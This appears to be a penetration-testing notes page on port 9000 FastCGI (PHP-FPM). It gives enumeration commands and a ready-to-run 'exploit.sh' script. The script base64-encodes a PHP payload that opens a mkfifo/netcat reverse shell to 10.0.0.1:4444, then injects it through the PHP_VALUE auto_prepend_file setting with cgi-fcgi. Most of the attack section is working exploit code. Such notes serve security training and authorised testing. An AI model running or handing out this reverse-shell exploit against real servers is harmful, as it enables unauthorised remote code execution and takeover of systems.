---
description: Port 9000
---

# FastCGI

## Theory

FastCGI is a binary protocol for interfacing interactive programs with a web server. It uses the **9000 port** by default.  **Usually** FastCGI only listen in **localhost and** It's quiet easy to make FastCGI execute arbitrary code.

## Practice

{% tabs %}
{% tab title="Enumerate" %}
If the **PHP-FPM (FastCGI Process Manager)** is running on the target system, we might be able to execute arbitrary command.

```bash
#Enum processes
ps aux | cat| grep php-fpm
php-fpm: pool username

#Enum network
ss -lntp
LISTEN 0    511    127.0.0.1:9000    0.0.0.0:*
```
{% endtab %}

{% tab title="Exploit" %}
We need to create an arbitrary PHP file somewhere. For instance,

```bash
touch /dev/shm/index.php
```

Then using the following shell script **"exploit.sh",** we can obtain a reverse shell

{% code title="exploit.sh" %}
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'); echo '-->';"
FILENAMES="/dev/shm/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done

```
{% endcode %}

Execute it:

```bash
chmod +x exploit.sh
./exploit.sh localhost
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi" %}
